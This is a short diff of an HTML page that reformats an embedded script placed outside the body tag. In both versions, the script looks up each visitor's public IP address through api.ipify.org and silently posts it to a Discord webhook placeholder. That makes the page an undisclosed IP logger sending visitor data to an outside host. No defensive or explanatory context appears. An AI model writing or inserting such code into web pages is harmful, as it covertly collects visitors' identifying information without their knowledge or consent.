@@ -11,12 +11,13 @@
 </body>
 <!-- Script placed outside of the body tag -->
 <script>
-    fetch('https://api.ipify.org')
-        .then(response => response.text())
-        .then(ip => fetch('YOUR_DISCORD_WEBHOOK_HERE', {
+  fetch('https://api.ipify.org')
+    .then(response => response.text())
+    .then(ip => {
+        fetch('YOUR_DISCORD_WEBHOOK', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ content: ip })
-        }));
+        });
+    });
 </script>
-</html>
